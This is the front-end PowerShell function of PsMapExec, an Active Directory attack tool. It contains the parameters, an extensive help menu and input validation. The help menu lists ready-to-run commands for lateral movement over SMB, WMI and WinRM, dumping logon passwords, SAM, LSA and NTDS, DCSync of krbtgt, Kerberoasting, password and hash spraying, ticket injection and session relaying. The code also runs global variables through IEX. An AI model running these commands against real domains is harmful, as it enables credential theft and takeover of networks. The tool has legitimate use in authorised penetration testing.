Function PsMapExec {

    [CmdletBinding(DefaultParameterSetName = 'Default')]
    Param(
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Command,

        [Alias("t")]
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Targets,

        [Alias("d")]
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Domain = "$env:USERDNSDOMAIN",

        [Alias("u")]
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Username,

        [Parameter(Mandatory = $False, Position = 0, ParameterSetName = 'Default')]
        [String]$Method,

        [Alias("m")]
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Module,

        [Alias("H")]
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Hash,

        [Alias("p")]
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Password,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$UserDomain,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [int]$Threads = 30,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Force,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$LocalAuth,
    
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$CurrentUser = $True,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$SuccessOnly,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$ShowOutput,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Ticket,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$AccountAsPassword,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$EmptyPassword,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [int]$Port,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$NoParse,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$SprayHash,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$SprayPassword,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$NoBanner,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$DomainController,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [int]$Timeout = 3000,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Flush,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Scramble,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Rainbow,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$Help,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Option,

        [Parameter(Mandatory = $False)]
        [ValidatePattern('^(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}$')]
        [string]$ListenerIP,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Elevate,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [ValidatePattern('^[cugt]+$')]
        [string]$Obfuscate,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$UserDN,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$ToggleAccount,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$AddComputer,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$RemoveComputer,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$TargetDN,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$GroupDN,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$SID,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Pre2k


    )


    if (-not $PSBoundParameters.ContainsKey('Method') -and $args.Count -ge 1) {
        $Module = $args[0]
    }



    function Write-Log {
        param (
            [String]$Message,
            [String]$Function
        )

        if ($VerbosePreference -ne 'Continue') {
            return
        }

        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $logMessage = "[{0}] - {1}" -f $timestamp, $Message

        if ($Message -match "initialising") {
            Write-Host "$logMessage" -ForegroundColor "Yellow"
        }
        else {
            Write-Host $logMessage -ForegroundColor "Cyan"
        }
    }

    try {
        if ($Host.UI.RawUI.BufferSize.Height -ne 20000) {
            $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(120, 20000)
        }
    
    }
    catch {}


    if ($Help) {

        $HelpOutput = @('

-----------------------------------------------------------------------------------------------------------
---------------------------------------------- [ Help Menu ] ---------------------------------------------- 

Documentation: https://github.com/The-Viper-One/PsMapExec/wiki

-----------------------------------------------------------------------------------------------------------
# Command Examples

# SMB
PsMapExec SMB -Targets "ALL" -Username "user" -Password "Pass" -Command "ipconfig" -Domain "security.local"
PsMapExec SMB -Targets "Workstations" -Username "user" -Password "Pass" -Module "LogonPasswords" -ShowOutput
PsMapExec SMB -Targets "DC01.Security.local" -Username "user" -Hash "8846F7EAEE8..." -Module "KerbDump" -ShowOutput
PsMapExec SMB -Targets "10.10.10.0/24" -Ticket "doIFmjCCBZagAwIBBaEDAgEWooIE..." 

# WMI
PsMapExec WMI -Targets "Servers" -Username "user" -Password "Pass" -Command "ipconfig"
PsMapExec WMI -Targets "Servers" -Username "administrator" -Password "Pass" -Module "SCCM" -LocalAuth
PsMapExec WMI -Targets "WKSTN0*" -Ticket "doIFmjCCBZagAwIBBaEDAgEWooIE..." -Domain "security.local"

# WinRM
PsMapExec WinRM -Targets "ALL" -Username "user" -Password "Pass" -Command "ipconfig"
PsMapExec WinRM -Targets "C:\scope.txt" -Ticket "doIFmjCCBZagAwIBBaEDAgEWooIE..." -Domain "security.local"
PsMapExec WinRM -Targets "DC01.Security.local" -Username "user" -Hash "8846F7EAEE8..." -Module "NTDS" -ShowOutput

# LDAP/S
PsMapExec LDAP -Targets "DCs" -Username "user" -Password "Pass"
PsMapExec LDAP -Targets "DC1" -Username "user" -Password "Pass" -module "whoami"
PsMapExec LDAP -Targets "DC1" -Ticket "doIFmjCCBZagAwIBBaEDAgEWooIE..." -Module "AddComputer" -Domain "security.local"
PsMapExec LDAP -Targets "DC1" -Username "user" -Password "Pass" -Module Elevate -TargetDN "CN=Mendez,CN=Users,DC=SECURITY,DC=LOCAL"
PsMapExec LDAP -Targets "DC1" -Username "user" -Hash "8846F7EAEE8..." -Module "timeroast" -ShowOutput

# Kerberoast stuff
PsMapExec kerberoast -Domain "dev.security.local" -ShowOutput 
PsMapExec kerberoast -Domain "dev.security.local" -Option "Kerberoast:dev_user_1" -ShowOutput

# RDP
PsMapExec RDP -Targets "Servers" -Username "user" -Password "password"
PsMapExec RDP -Targets "Servers" -Username "user" -Password "password" -Domain "dev.security.local" -LocalAuth

# DCSync 
PsMapExec DCSync -Targets "DC1.security.local" -ShowOutput -Domain "security.local"
PsMapExec DCSync -Targets "DC1.security.local" -option "dcsync:security\krbtgt" -ShowOutput

# SMB Signing
PsMapExec GenRelayList -Targets "All" -Domain "Security.local"
PsMapExec GenRelayList -Targets "Servers" -Domain "Security.local"

# Inject Kerberos tickets into current session
PsMapExec Inject -Ticket "doIhsj..."
PsMapExec Inject -Ticket "C:\ticket.txt"
PsMapExec Inject -Username "user" -Hash "8846F7EAEE8..." -Domain "security.local"
PsMapExec Inject -Username "user" -Password "password" -Domain "security.local"

# IPMI hashes
PsMapExec IPMI -Targets "Servers" -Domain "security.local"
PsMapExec IPMI -Targets "All" -Option "IPMI:bob_admin"

# MSSQL
PsMapExec MSSQL -Targets "All" -Username "SA" -Password "Password123" -LocalAuth
PsMapExec MSSQL -Targets "All" -Command "whoami" -Domain "security.local"

# Spray credentials
PsMapExec Spray -SprayPassword "password" 
PsMapExec Spray -AccountAsPassword -Domain "dev.security.local"
PsMapExec Spray -EmptyPassword -Domain "security.local"
PsMapExec Spray -Pre2k
PsMapExec Spray -SprayHash [RC4]
PsMapExec Spray -SprayHash [AES256]
PsMapExec Spray -SprayHash [LM:NT]

# Check for VNC no auth
PsMapExec VNC -Target "All" -Domain "Security.local"

 ---------------------------------------------- [ End Menu ] ----------------------------------------------- 
 -----------------------------------------------------------------------------------------------------------

')

        $HelpOutput | Write-Output
        return

    }

    if (!$Method) {
    
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "You must provide a value for -Method"
    
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Run ""PsMapExec -help"" for command line usage"
        Write-Host
    
        return
    
    }

    $startTime = Get-Date
    Set-Variable MaximumHistoryCount 32767

    # Set the targets variable if not provided when spraying
    if ($Method -eq "Spray" -and [string]::IsNullOrWhiteSpace($Targets)) {
        $Targets = "all"
    }

    # Set target to "127.0.0.1" when localhost is specified
    if ($Targets -eq "localhost") {
        $Targets = "127.0.0.1"
    }

    # Check if targeting the local system (127.0.0.1)
    if ($Targets -eq "127.0.0.1") {

        # Check if user is SYSTEM or a local administrator
        $Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if (-not ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM" -or 
                $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {

            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            return "Ensure this script is run with administrative privileges when targeting the local system."
        }
    }




    ################################################################################################################
    ###################################### Banner and version information ##########################################
    ################################################################################################################

    $Banner = @("
  _____   _____ __  __          _____  ________   ________ _____ 
 |  __ \ / ____|  \/  |   /\   |  __ \|  ____\ \ / /  ____/ ____|
 | |__) | (___ | \  / |  /  \  | |__) | |__   \ V /| |__ | |     
 |  ___/ \___ \| |\/| | / /\ \ |  ___/|  __|   > < |  __|| |     
 | |     ____) | |  | |/ ____ \| |    | |____ / . \| |___| |____ 
 |_|    |_____/|_|  |_/_/    \_\_|    |______/_/ \_\______\_____|
                                                                 

Github  : https://github.com/The-Viper-One
Wiki    : https://github.com/The-Viper-One/PsMapExec/wiki
Version : 0.8.1")

    # Display banner once then prevent for consecutive execution
    Function DisplayBanner {
    
        if ($Global:DoNotShowBanner -gt 0) { Write-Output "" ; return }
    
        Write-output $Banner
        [int]$Global:DoNotShowBanner = 1
    }

    DisplayBanner


    ################################################################################################################
    ########################################### Initial Directory Setup ############################################
    ################################################################################################################

    $WorkingDirectory = (Get-Item -Path ".\").FullName


    try {
        $testFilePath = Join-Path $WorkingDirectory "Test.PME"
        New-Item -ItemType "File" -Name "Test.PME" -Path $WorkingDirectory -Force -ErrorAction "Stop" | Out-Null
        Remove-Item -Path $testFilePath -Force | Out-Null
    }
    catch {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Current directory is not writeable, change to a different directory and try again"
        return
    }

    $PME = Join-Path $WorkingDirectory "PME"
    $BloodHound = Join-Path $PME "BloodHound"
    $ConsoleHistory = Join-Path $PME "Console History"
    $DCSyncDir = Join-Path $PME "DCSync"
    $DCSyncFullDump = Join-Path $DCSyncDir "DCSync_Full_Dump"
    $DCSyncUser = Join-Path $DCSyncDir "DCSync_User_Dump"
    $DPAPI = Join-Path $PME "DPAPI"
    $ekeys = Join-Path $PME "eKeys"
    $FileZilla = Join-Path $PME "FileZilla"
    $IPMI = Join-Path $PME "IPMI"
    $Kerberoast = Join-Path $PME "Kerberoast"
    $LogonPasswords = Join-Path $PME "LogonPasswords"
    $LSA = Join-Path $PME "LSA"
    $LSADump = Join-Path $LSA "LSA-Dump"
    $LSATrust = Join-Path $LSA "LSA-Trusts"
    $MDF = Join-Path $PME "MDF"
    $MSSQL = Join-Path $PME "MSSQL"
    $NotePad = Join-Path $PME "Notepad"
    $NTLM = Join-Path $PME "NTLM"
    $RDP = Join-Path $PME "RDP"
    $SAM = Join-Path $PME "SAM"
    $SCCM = Join-Path $PME "SCCM"
    $SessionExec = Join-Path $PME "SessionExec"
    $SessionRelay = Join-Path $PME "Relay"
    $Sessions = Join-Path $PME "Sessions"
    $SMB = Join-Path $PME "SMB"
    $Spraying = Join-Path $PME "Spraying"
    $SSH = Join-Path $PME "SSH"
    $TGTDeleg = Join-Path $PME "TGTDeleg"
    $Tickets = Join-Path $PME "Tickets"
    $TimeRoast = Join-Path $PME "TimeRoast"
    $UserFiles = Join-Path $PME "User Files"
    $VNCRoot = Join-Path $PME "VNC"
    $VNCDump = Join-Path $VNCRoot "VNC Dump"
    $VNC = Join-Path $VNCRoot "VNC NoAuth"
    $Wifi = Join-Path $PME "Wi-Fi"
    $WinSCP = Join-Path $PME "WinSCP"

    $directories = @(
        $BloodHound,
        $ConsoleHistory,
        $DCSyncDir,
        $DCSyncFullDump,
        $DCSyncUser,
        $DPAPI,
        $ekeys,
        $FileZilla,
        $IPMI,
        $Kerberoast,
        $LogonPasswords,
        $LSA,
        $LSADump,
        $LSATrust,
        $MDF,
        $MSSQL,
        $NotePad,
        $NTLM,
        $RDP,
        $SAM,
        $SCCM,
        $SessionExec,
        $SessionRelay,
        $Sessions,
        $SMB,
        $Spraying,
        $SSH,
        $TGTDeleg,
        $Tickets,
        $TimeRoast,
        $UserFiles,
        $VNC,
        $VNCDump,
        $Wifi,
        $WinSCP
    )


    # Create PME Root folder first before populating
    if (-not (Test-Path $PME)) {
        New-Item -ItemType Directory -Force -Path $PME | Out-Null
        Write-Host
        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
        Write-Host "Created directory for PME at $PME"
        Write-Host
        Start-sleep -seconds "3"
    }

    # Now create the subdirectories
    foreach ($directory in $directories) {
        if (-not (Test-Path $directory)) {
            Write-Log "Creating directory $directory"
            New-Item -ItemType Directory -Force -Path $directory | Out-Null
        }
    }


    #Create the initial template for collected Bloodhound queries
    Create-QueryTemplate

    ################################################################################################################
    ########################################### Misc Pre-setup Commands ############################################
    ################################################################################################################
    
    $Global:Encrypt | IEX
    $Global:rbs | IEX

    ################################################################################################################
    ########################################### Misc Variable Collection ###########################################
    ################################################################################################################

    if ($Username -like "*@*") {
    
        $UserDomain = $Username.Split('@')[1]
        $Username = $Username.Split('@')[0]
    
    }

    function Test-DomainJoinStatus {
        if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
            return $true
        }
        else {
            return $false
        }

    }

    $DomainJoined = Test-DomainJoinStatus

    $Klist = -not (& klist | Select-String -Pattern "Cached Tickets: \(0\)")
    if (!$klist) { Write-Log -Message  "No Kerberos tickets in cache" }

    Function Inform-Inject {

        if (!$Klist -and $Method -ne "Inject") {
            Write-Host
            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
            Write-Host "For non-domain systems, use -Method ""Inject"" for PsMapExec to function correctly."
            Write-Host
            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
            Write-Host "PsMapExec -Domain Security.local -Method Inject -Username User -Password Pass"
            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
            Write-Host "PsMapExec -Domain Security.local -Method Inject -Username User -Hash Hash"
            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
            Write-Host "PsMapExec -Domain Security.local -Method Inject -Ticket [Base64 ticket / Path to ticket]"
            break
        }
        return
    }

    if ($DomainJoined) {
        if ($NoBanner) { Write-Output "" }
        #Write-Output "Domain  : Yes"
    }
    elseif (!$DomainJoined) {
        if ($NoBanner) { Write-Output "" }
        #Write-Output "Domain  : No"
        Inform-Inject
        if ($Global:SkipRestoreTicket -eq $null) { $Global:SkipRestoreTicket = $false }
    }

    function Flush {
        Write-Log -Message  "[Flush] LDAP flushed"

        # Reset group membership variables
        $Global:DomainAdmins = $null
        $Global:EnterpriseAdmins = $null
        $Global:ServerOperators = $null
        $Global:AccountOperators = $null
        $FQDNDomainPlusDomainAdmins = $null
        $FQDNDomainPlusEnterpriseAdmins = $null
        $FQDNDomainPlusServerOperators = $null
        $FQDNDomainPlusAccountOperators = $null

        # Additional groups
        $Global:HyperVAdministrators = $null
        $Global:StorageReplicateAdministrators = $null
        $Global:SchemaAdmins = $null
        $Global:KeyAdmins = $null
        $Global:EnterpriseKeyAdmins = $null
        $Global:DnsAdmins = $null
        $Global:DHCPAdministrators = $null
        $FQDNDomainPlusHyperVAdministrators = $null
        $FQDNDomainPlusStorageReplicateAdministrators = $null
        $FQDNDomainPlusSchemaAdmins = $null
        $FQDNDomainPlusKeyAdmins = $null
        $FQDNDomainPlusEnterpriseKeyAdmins = $null
        $FQDNDomainPlusDnsAdmins = $null
        $FQDNDomainPlusDHCPAdministrators = $null

        # Additional groups
        $Global:GroupPolicyCreatorOwners = $null
        $Global:BackupOperators = $null
        $Global:CertPublishers = $null
        $Global:PrintOperators = $null
        $Global:OrganizationManagement = $null
        $Global:ServerManagement = $null
        $FQDNDomainPlusGroupPolicyCreatorOwners = $null
        $FQDNDomainPlusBackupOperators = $null
        $FQDNDomainPlusCertPublishers = $null
        $FQDNDomainPlusPrintOperators = $null
        $FQDNDomainPlusOrganizationManagement = $null
        $FQDNDomainPlusServerManagement = $null

        # Reset isChecked flags to 0
        $Global:DomainAdminsChecked = 0
        $Global:EnterpriseAdminsChecked = 0
        $Global:ServerOperatorsChecked = 0
        $Global:AccountOperatorsChecked = 0
        $Global:HyperVAdministratorsChecked = 0
        $Global:StorageReplicateAdministratorsChecked = 0
        $Global:SchemaAdminsChecked = 0
        $Global:KeyAdminsChecked = 0
        $Global:EnterpriseKeyAdminsChecked = 0
        $Global:DnsAdminsChecked = 0
        $Global:DHCPAdministratorsChecked = 0
        $Global:GroupPolicyCreatorOwnersChecked = 0
        $Global:BackupOperatorsChecked = 0
        $Global:CertPublishersChecked = 0
        $Global:PrintOperatorsChecked = 0
        $Global:OrganizationManagementChecked = 0
        $Global:ServerManagementChecked = 0

        # Reset target variables
        $Global:TargetsServers = $null
        $Global:TargetsWorkstations = $null
        $Global:TargetsDomainControllers = $null
        $Global:TargetsAll = $null


    }

    [int]$Global:SuccessCount = 0
    [int]$Global:AccessDeniedCount = 0
    [int]$Global:AttemptedCount = 0


    Function LastDomain {

        <#
.SYNOPSIS
Tracks domain name changes and flushes stored LDAP queries when a new domain is detected.

.DESCRIPTION
The LastDomain function is designed to manage and track the domain name currently being processed. 
It ensures that LDAP query results stored in memory are relevant to the current domain. 
If a change in the domain name is detected compared to the last run, the function triggers a flush operation. 
This flush operation clears the stored LDAP queries to prevent the reuse of results from a different domain.
#>
        param ($Domain)
    
        if ($null -eq $Global:LastDomain) {
            $Global:LastDomain = $null
            Write-Log -Message  "Initialized $Global:LastDomain to null since it was not previously set"
        }

        if ($Global:LastDomain -ne $Domain) {
            if ($Global:LastDomain -ne $null) {
                Write-Log -Message  "[LastDomain] Domain change detected. Previous domain: '$Global:LastDomain', New domain: $Domain"
                Flush
            }
            else {
                Write-Log -Message  "This is the first run or $Global:LastDomain was previously null. Setting domain to $Domain"
            }
            $Global:LastDomain = $Domain
        }
        else {
            if ($Global:LastDomain -eq $null) {
                Write-Log -Message  "[LastDomain] No previous domain set. Initializing $Global:LastDomain with $Domain"
                $Global:LastDomain = $Domain
            }
            else {
                Write-Log -Message  "[LastDomain] No domain change detected. Continuing with cached LDAP queries"
            }
        }
    }

    LastDomain -Domain $Domain

    <# 
    Ideally, when UserDomain is populated we can could track queried LDAP objects.
    The easier option for the moment is to flush when populated so we do not pollute
    the ldap queries with objects from a different domain
    #>
    if ($Flush -or $UserDomain -ne "") { Flush }

    # If no targets have been provided
    if (-not $Targets -and $Method -ne "Spray" -and $Method -ne "Kerberoast" -and $Method -ne "Inject") {
    
        Write-Host
        Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
        Write-host "You must provide a value for -targets (all, servers, DCs, Workstations or an individual system FQDN)"
        return
    }

    if ($Targets -match "^\*+$") {
    
        Write-Host
        Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
        Write-Host "The target cannot consist only of asterisks. Please specify a more specific target."
        return
    }


    if ($Targets -match "^\*.*|.*\*$") { Write-Host "Targets : Wildcard matching" }
    elseif ($Targets -eq "Workstations") { Write-Host "Targets : Workstations" }
    elseif ($Targets -eq "Servers") { Write-Host "Targets : Servers" }
    elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") { Write-Host "Targets : Domain Controllers" }
    elseif ($Targets -eq "All" -or $Targets -eq "Everything") { Write-Host "Targets : All" }
    elseif ($Targets -notmatch "\*" -and $Method -ne "Spray" -and $Method -ne "Kerberoast" -and "$Method" -ne "Inject") { $IsFile = Test-Path $Targets ; if ($IsFile) { Write-Host "Targets : File ($Targets)" } }
    Write-Output ""
    

    ################################################################################################################
    ####################################### Some logic based checking ##############################################
    ################################################################################################################
    
    # Method Validation
    if ($Method -ne "") {
        switch ($Method) {
            "All" {}
            "DCSync" {}
            "GenRelayList" {}
            "Inject" {}
            "IPMI" {}
            "Kerberoast" {}
            "LDAP" {}
            "LDAPS" {}
            "MSSQL" {}
            "RDP" {}
            "SMB" {}
            "SessionHunter" {}
            "Spray" {}
            "VNC" {}
            "WMI" {}
            "WinRM" {}
            default {
                Write-Host
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Invalid Method specified"
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Specify either: All, DCSync, GenRelayList, Inject, IPMI, Kerberoast, LDAP, LDAPS, MSSQL, RDP, SMB, SessionHunter, Spray, VNC, WMI, or WinRM"
                return
            }
        }
    }


    # Module Validation
    # Module Validation
    if ($Module -ne "") {
        switch ($Module) {
            "AddComputer" {}
            "AddRBCD" {}
            "AddSPN" {}
            "AddToGroup" {}
            "Amnesiac" {}
            "ConsoleHistory" {}
            "DPAPI" {}
            "Elevate" {}
            "eKeys" {}
            "FileZilla" {}
            "Files" {}
            "KerbDump" {}
            "LogonPasswords" {}
            "LSA" {}
            "LSA-Trust" {}
            "MDF" {}
            "MAQ" {}
            "Notepad" {}
            "NTDS" {}
            "NTLM" {}
            "RemoveComputer" {}
            "RemoveFromGroup" {}
            "RemoveRBCD" {}
            "RemoveSPN" {}
            "ResetPassword" {}
            "RunAsPPL" {}
            "SAM" {}
            "SCCM" {}
            "SSH" {}
            "SessionExec" {}
            "SessionRelay" {}
            "TGTDeleg" {}
            "Test" {}
            "Tickets" {}
            "Timeroast" {}
            "ToggleAccount" {}
            "VMCheck" {}
            "VNC" {}
            "WHOAMI" {}
            "WiFi" {}
            "WinSCP" {}
            default {
                Write-Host
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Invalid Module specified"
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Specify either: AddComputer, AddRBCD, AddSPN, AddToGroup, Amnesiac, ConsoleHistory, DPAPI, Elevate, ekeys, FileZilla, Files, KerbDump, LogonPasswords, LSA, LSA-Trust, MDF, MAQ, Notepad, NTDS, NTLM, RemoveComputer, RemoveFromGroup, RemoveRBCD, RemoveSPN, ResetPassword, RunAsPPL, SAM, SCCM, SSH, SessionExec, SessionRelay, TGTDeleg, Test, Tickets, Timeroast, ToggleAccount VMCheck, VNC, WHOAMI, WiFi, or WinSCP"
                return
            }
        }
    }


    # Authentication Validation
    if ($Hash -ne "" -and $LocalAuth) {
        Write-Host
        Write-Host "[-] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Hash and Local authentication not supported"
        return
    }

    if ($Ticket -and $LocalAuth) {
        Write-Host
        Write-Host "[-] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Ticket and Local authentication not supported as tickets are intended for domain level authentication"
        return
    }

    # Module Specific Checks
    if ($Module -eq "SessionRelay") {
        if ($ListenerIP -eq "") {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "You must specify -ListenerIP ""10.10.10.100"" for a host for Session authentication to be relayed to."
            return
        }
        else {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "About to relay user Logon Sessions to the provided IP address [$ListenerIP]. Ensure Responder or Inveigh is running!"
        }
    }

    if ($Module -eq "NTDS" -and $Targets -in @("Everything", "Workstations", "all", "Servers")) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "You must specify a single domain controller (e.g., DC01.Security.local) or 'DC', 'DCs', 'Domain Controllers' as a target when using the NTDS module"
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "For example: -Targets DCs, -Targets DC01.Security.local"
        return
    }

    # Threads Validation
    if ($Threads -lt 1 -or -not [int]::TryParse($Threads, [ref]0)) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be less than 1"
        return
    }

    if ($Threads -gt 100) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be more than 100. This will likely cause results to be missed."
        return
    }

    # Domain Check
    if (!$DomainJoined) {
        Write-Log " Current system is not domain joined, setting `$CurrentUser to False"
        $CurrentUser = $False
    }

    if ($Domain -eq "" -and $DomainJoined -eq $False) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "This system appears to be a non-domain joined system. You must specify a target Domain ""-Domain Security.local"""
        return
    }

    # User Context Validation
    if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
        $CurrentUser = $False
    }
    if ($Method -in @("Spray", "GenRelayList", "RDP", "MSSQL")) {
        $CurrentUser = $True
    }

    # Method Specific Checks
    if ($Method -eq "" -and !$SessionHunter -and !$Spray) {
        Write-Host
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "No method specified"
        return
    }

    if ($Method -eq "RDP") {
        if ($Hash -ne "") {
            Write-Host
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Hash authentication not currently supported with RDP"
            return
        }

        if ($Ticket -ne "") {
            Write-Host
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Ticket authentication not currently supported with RDP"
            return
        }

        if ($Username -eq "" -or $Password -eq "") {
            Write-Host
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "-Username and -Password parameters required when using the method RDP"
            return
        }
    }

    if ($Method -eq "VNC") {
        if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
            $CurrentUser = $True
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Method VNC does not support authentication material, it simply checks if No Auth is enabled."
            Write-Host
        }
    }

    if ($Method -eq "Spray") {

        if (!$EmptyPassword -and !$AccountAsPassword -and $SprayHash -eq "" -and $SprayPassword -eq "" -and (!$Pre2k)) {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
            Write-Host "We need something to spray"
            Write-Host
            Write-Host "PsMapExec -Method Spray -SprayPassword [Password]"
            Write-Host "PsMapExec -Method Spray -SprayHash [Hash]"
            Write-Host "PsMapExec -Method Spray -AccountAsPassword"
            Write-Host "PsMapExec -Method Spray -EmptyPassword"
            return
        }

        elseif ($SprayHash -ne "" -and $SprayPassword -ne "") {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
            Write-Host "Hash and Password detected"
            return
        }

        elseif (($EmptyPassword -and $SprayHash -ne "") -or ($EmptyPassword -and $SprayPassword -ne "")) {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
            Write-Host "Password or hash value provided with -EmptyPassword"
            return
        }

        elseif (($AccountAsPassword -and $SprayHash -ne "") -or ($AccountAsPassword -and $SprayPassword -ne "")) {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
            Write-Host "Password or hash value provided with -AccountAsPassword"
            return
        }

        elseif ($AccountAsPassword -and $EmptyPassword) {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
            Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
            return
        }
    }

    if ($Method -eq "WinRM" -and !$DomainJoined) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Be aware, using WinRM from a non-domain joined system typically does not work"
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "This is default and expected behaviour. This system will need to be configured as a trusted host on the remote system to allow access"
    }

    if ($Method -eq "ALL" -and ($Module -ne "" -or $Command -ne "")) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Method ""All"" does not support command or module execution currently"
        return
    }

    if ($Method -eq "MSSQL") {
        if ($LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Looks like you are missing either -Username or -Password"
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
            return
        }

        if (!$LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Looks like you are missing either -Username or -Password"
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "You can append -LocalAuth if you wish to authenticate with a -Username and -Password as SQL Authentication"
            return
        }
    }

